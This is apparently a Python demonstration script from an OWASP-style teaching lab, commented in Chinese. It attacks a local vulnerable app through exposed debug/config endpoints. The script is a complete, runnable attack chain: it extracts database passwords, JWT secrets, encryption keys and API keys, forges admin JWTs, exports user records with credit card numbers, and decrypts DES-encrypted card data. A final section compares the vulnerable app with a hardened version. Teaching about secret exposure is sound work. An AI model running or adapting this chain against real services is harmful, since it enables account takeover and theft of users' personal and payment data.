#!/usr/bin/env python3
"""
敏感資料曝露攻擊腳本
====================
此腳本展示如何利用設定 API 取得敏感資訊並進行後續攻擊。

攻擊原理：
---------
1. Debug/Config 端點曝露敏感設定
2. 取得 JWT secret 後可偽造任意 Token
3. 取得加密金鑰後可解密所有加密資料
4. 取得 DB 密碼後可直接存取資料庫

CWE-200: Exposure of Sensitive Information
CWE-209: Information Exposure Through an Error Message
CWE-215: Information Exposure Through Debug Information

作者：OWASP Demo
"""

import requests
import argparse
import json
import base64
import hashlib
import hmac
from datetime import datetime, timedelta

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def get_config(url: str = VULNERABLE_URL) -> dict:
    """
    從 debug/config API 取得設定
    """
    response = requests.get(f"{url}/api/debug/config")
    if response.status_code == 200:
        return response.json()
    return None


def get_environment(url: str = VULNERABLE_URL) -> dict:
    """
    從 debug/env API 取得環境變數
    """
    response = requests.get(f"{url}/api/debug/env")
    if response.status_code == 200:
        return response.json()
    return None


def base64url_encode(data: bytes) -> str:
    """Base64 URL 編碼"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data: str) -> bytes:
    """Base64 URL 解碼"""
    padding = 4 - len(data) % 4
    data += '=' * padding
    return base64.urlsafe_b64decode(data)


def forge_jwt(secret: str, payload: dict) -> str:
    """
    使用洩露的 secret 偽造 JWT
    """
    header = {"alg": "HS256", "typ": "JWT"}
    
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    
    # 使用洩露的 secret 簽名
    message = f"{header_encoded}.{payload_encoded}"
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    signature_encoded = base64url_encode(signature)
    
    return f"{header_encoded}.{payload_encoded}.{signature_encoded}"


def attack_extract_secrets():
    """
    🔴 攻擊：提取敏感設定
    """
    print("\n" + "=" * 60)
    print("🔴 提取敏感設定攻擊")
    print("=" * 60)
    
    print("\n📋 步驟 1：存取 /api/debug/config...")
    
    config = get_config()
    if not config:
        print("❌ 無法取得設定")
        return None
    
    print("✅ 成功取得系統設定！\n")
    
    # 資料庫設定
    db = config.get("database", {})
    if db:
        print("📌 資料庫設定：")
        print(f"   URL：{db.get('url')}")
        print(f"   使用者：{db.get('username')}")
        print(f"   密碼：{db.get('password')}")
        print("   ⚠️ 攻擊者可直接連接資料庫！")
    
    # JWT 設定
    jwt = config.get("jwt", {})
    if jwt:
        print("\n📌 JWT 設定：")
        secret = jwt.get('secret', '')
        print(f"   密鑰：{secret[:30]}..." if len(secret) > 30 else f"   密鑰：{secret}")
        print(f"   演算法：{jwt.get('algorithm')}")
        print("   ⚠️ 攻擊者可偽造任意 Token！")
    
    # 加密設定
    encryption = config.get("encryption", {})
    if encryption:
        print("\n📌 加密設定：")
        print(f"   DES 金鑰：{encryption.get('des_key')}")
        print(f"   AES 金鑰：{encryption.get('aes_key')}")
        print("   ⚠️ 攻擊者可解密所有加密資料！")
    
    # API 金鑰
    api_keys = config.get("api_keys", {})
    if api_keys:
        print("\n📌 第三方 API 金鑰：")
        for name, key in api_keys.items():
            print(f"   {name}：{key[:25]}...")
        print("   ⚠️ 攻擊者可冒用這些服務！")
    
    return config


def attack_forge_admin_token():
    """
    🔴 攻擊：使用洩露的 JWT secret 偽造管理員 Token
    """
    print("\n" + "=" * 60)
    print("🔴 偽造管理員 Token 攻擊")
    print("=" * 60)
    
    # 取得 JWT secret
    config = get_config()
    if not config:
        print("❌ 無法取得設定")
        return
    
    jwt_secret = config.get("jwt", {}).get("secret")
    if not jwt_secret:
        print("❌ 無法取得 JWT secret")
        return
    
    print(f"\n📋 步驟 1：取得 JWT secret")
    print(f"   Secret：{jwt_secret[:30]}...")
    
    print("\n📋 步驟 2：建立管理員 Payload")
    now = datetime.utcnow()
    payload = {
        "sub": "hacker",
        "userId": 999,
        "username": "hacker",
        "email": "hacker@evil.com",
        "role": "ADMIN",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    print(f"   Payload：{json.dumps(payload, indent=2)}")
    
    print("\n📋 步驟 3：使用洩露的 secret 簽名")
    forged_token = forge_jwt(jwt_secret, payload)
    print(f"   Token：{forged_token[:50]}...")
    
    print("\n📋 步驟 4：使用偽造的 Token 存取管理員功能")
    
    # 存取 /api/auth/me
    response = requests.get(
        f"{VULNERABLE_URL}/api/auth/me",
        headers={"Authorization": f"Bearer {forged_token}"}
    )
    
    if response.status_code == 200:
        print("✅ 成功以管理員身份存取！")
        print(f"   回應：{json.dumps(response.json(), indent=2, ensure_ascii=False)}")
    else:
        print(f"   回應：{response.status_code}")
    
    # 存取管理員 API
    response = requests.get(
        f"{VULNERABLE_URL}/api/admin/users",
        headers={"Authorization": f"Bearer {forged_token}"}
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"\n✅ 成功存取使用者列表！共 {len(users)} 個使用者")
    else:
        print(f"   管理員 API 回應：{response.status_code}")


def attack_chain():
    """
    🔴 攻擊鏈：完整攻擊流程
    """
    print("\n" + "=" * 60)
    print("🔴 完整攻擊鏈演示")
    print("=" * 60)
    
    print("\n📋 階段 1：資訊收集")
    print("-" * 40)
    
    config = get_config()
    if not config:
        print("❌ 無法取得設定，攻擊終止")
        return
    
    jwt_secret = config.get("jwt", {}).get("secret")
    des_key = config.get("encryption", {}).get("des_key")
    db_password = config.get("database", {}).get("password")
    
    print(f"✅ JWT Secret：{jwt_secret[:20]}...")
    print(f"✅ DES Key：{des_key}")
    print(f"✅ DB Password：{db_password}")
    
    print("\n📋 階段 2：偽造管理員 Token")
    print("-" * 40)
    
    now = datetime.utcnow()
    admin_payload = {
        "sub": "admin",
        "userId": 1,
        "username": "admin",
        "role": "ADMIN",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    admin_token = forge_jwt(jwt_secret, admin_payload)
    print(f"✅ 偽造 Token：{admin_token[:40]}...")
    
    print("\n📋 階段 3：使用管理員權限存取資料")
    print("-" * 40)
    
    # 取得所有使用者
    response = requests.get(
        f"{VULNERABLE_URL}/api/users/export",
        headers={"Authorization": f"Bearer {admin_token}"}
    )
    
    if response.status_code == 200:
        data = response.json()
        users = data.get("users", [])
        print(f"✅ 取得 {len(users)} 個使用者的完整資料")
        
        for user in users[:2]:
            print(f"   - {user.get('username')}: {user.get('email')}")
            if user.get('creditCard'):
                print(f"     信用卡：{user.get('creditCard')}")
    
    print("\n📋 階段 4：解密敏感資料")
    print("-" * 40)
    
    # 取得加密的信用卡
    response = requests.get(f"{VULNERABLE_URL}/api/users/1/sensitive")
    if response.status_code == 200:
        data = response.json()
        encrypted_cc = data.get("creditCardEncrypted")
        print(f"   加密信用卡：{encrypted_cc}")
        
        # 使用 DES 金鑰解密
        from Crypto.Cipher import DES
        from Crypto.Util.Padding import unpad
        import base64
        
        try:
            cipher = DES.new(des_key.encode('utf-8'), DES.MODE_ECB)
            encrypted_bytes = base64.b64decode(encrypted_cc)
            decrypted = unpad(cipher.decrypt(encrypted_bytes), DES.block_size)
            print(f"   ✅ 解密後：{decrypted.decode('utf-8')}")
        except Exception as e:
            print(f"   解密失敗：{e}")
    
    print("\n📊 攻擊鏈總結：")
    print("   1. /api/debug/config → 取得所有密鑰")
    print("   2. JWT Secret → 偽造管理員 Token")
    print("   3. 管理員權限 → 存取所有使用者資料")
    print("   4. DES Key → 解密加密的信用卡號")
    print("\n⚠️ 從一個曝露的 Config API 到完整的資料外洩！")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 敏感資料曝露：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    endpoints = [
        ("/api/debug/config", "系統設定"),
        ("/api/debug/env", "環境變數"),
        ("/api/debug/health", "健康檢查"),
        ("/api/users/export", "使用者匯出"),
        ("/api/users/1/sensitive", "使用者敏感資料"),
    ]
    
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    for endpoint, desc in endpoints:
        response = requests.get(f"{VULNERABLE_URL}{endpoint}")
        status = "✅ 可存取" if response.status_code == 200 else f"❌ {response.status_code}"
        print(f"   {endpoint}: {status}")
    
    print("\n🔒 安全版本（http://localhost:8082）：")
    for endpoint, desc in endpoints:
        response = requests.get(f"{SECURE_URL}{endpoint}")
        status = "✅ 可存取" if response.status_code == 200 else f"❌ {response.status_code}"
        print(f"   {endpoint}: {status}")
    
    print("\n📋 安全版本的防護措施：")
    print("   1. ✅ Debug 端點在生產環境禁用")
    print("   2. ✅ 敏感設定從環境變數讀取")
    print("   3. ✅ API 不回傳敏感資料")
    print("   4. ✅ 使用 DTO 過濾敏感欄位")
    print("   5. ✅ 敏感端點需要管理員權限")


def main():
    parser = argparse.ArgumentParser(
        description="敏感資料曝露攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python secret_exposure.py --extract     # 提取敏感設定
  python secret_exposure.py --forge       # 偽造管理員 Token
  python secret_exposure.py --chain       # 完整攻擊鏈
  python secret_exposure.py --compare     # 比較漏洞/安全版本
  python secret_exposure.py --all         # 執行完整演示
        """
    )
    
    parser.add_argument("--extract", action="store_true", help="提取敏感設定")
    parser.add_argument("--forge", action="store_true", help="偽造管理員 Token")
    parser.add_argument("--chain", action="store_true", help="完整攻擊鏈")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔓 敏感資料曝露攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    if args.all:
        attack_extract_secrets()
        attack_forge_admin_token()
        attack_chain()
        compare_vulnerability()
    elif args.extract:
        attack_extract_secrets()
    elif args.forge:
        attack_forge_admin_token()
    elif args.chain:
        attack_chain()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python secret_exposure.py --all")
    
    print("\n📦 需要安裝：pip install pycryptodome")


if __name__ == "__main__":
    main()
